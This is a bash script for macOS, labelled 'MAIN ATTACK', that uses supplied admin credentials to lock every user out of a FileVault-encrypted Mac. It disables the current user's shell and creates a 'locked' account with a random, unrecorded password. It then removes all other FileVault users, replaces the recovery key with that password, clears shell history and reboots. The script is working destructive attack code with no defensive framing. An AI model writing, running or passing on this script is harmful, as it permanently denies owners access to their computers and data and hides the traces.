#! /bin/bash

ADMINUSER=""
ADMINPW=""
USER=$(ls /Users | grep -vE "$ADMINUSER|Shared|.localized")
PASSWORD=$(openssl rand -hex 96)

# PLIST GENERATOR
echo "<?xml version="1.0" encoding="UTF-8"?>" >> /tmp/.temp.plist
echo "<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">" >> /tmp/.temp.plist
echo "<plist version="1.0">" >> /tmp/.temp.plist
echo "<dict>" >> /tmp/.temp.plist
echo "<key>Username</key>" >> /tmp/.temp.plist
echo "<string>$ADMINUSER</string>" >> /tmp/.temp.plist
echo "<key>Password</key>" >> /tmp/.temp.plist
echo "<string>$ADMINPW</string>" >> /tmp/.temp.plist
echo "<key>AdditionalUsers</key>" >> /tmp/.temp.plist
echo "<array>" >> /tmp/.temp.plist
echo "    <dict>" >> /tmp/.temp.plist
echo "        <key>Username</key>" >> /tmp/.temp.plist
echo "        <string>locked</string>" >> /tmp/.temp.plist
echo "        <key>Password</key>" >> /tmp/.temp.plist
echo "        <string>$PASSWORD</string>" >> /tmp/.temp.plist
echo "    </dict>" >> /tmp/.temp.plist
echo "</array>" >> /tmp/.temp.plist
echo "</dict>" >> /tmp/.temp.plist
echo "</plist>" >> /tmp/.temp.plist

# MAIN ATTACK
dscl . -change /Users/$USER UserShell /bin/bash /usr/bin/false
dscl . -create /Users/locked
dscl . -create /Users/locked UserShell /bin/bash
dscl . -create /Users/locked RealName "LOCKEDOUT"
dscl . -create /Users/locked UniqueID "67676"
dscl . -create /Users/locked PrimaryGroupID 20
dscl . -passwd /Users/locked $PASSWORD
fdesetup add -inputplist < /tmp/.temp.plist
fdesetup remove -user $ADMINUSER

# REPLACE RECOVERY KEY
expect -c "
log_user 0
spawn fdesetup changerecovery -personal
expect \"Enter a password for '/', or the recovery key:\"
send "{${PASSWORD}}"
send \r
log_user 1
expect eof
"

# LOOPED REMOVE FV
fvuserlist=$(fdesetup list | cut -d ',' -f1 | grep -v locked)
for i in $fvuserlist
do
	fdesetup remove -user $i
done

# CLEANUP
history -c
rm /tmp/.temp.plist

# CLOSING DOWN
shutdown -r now
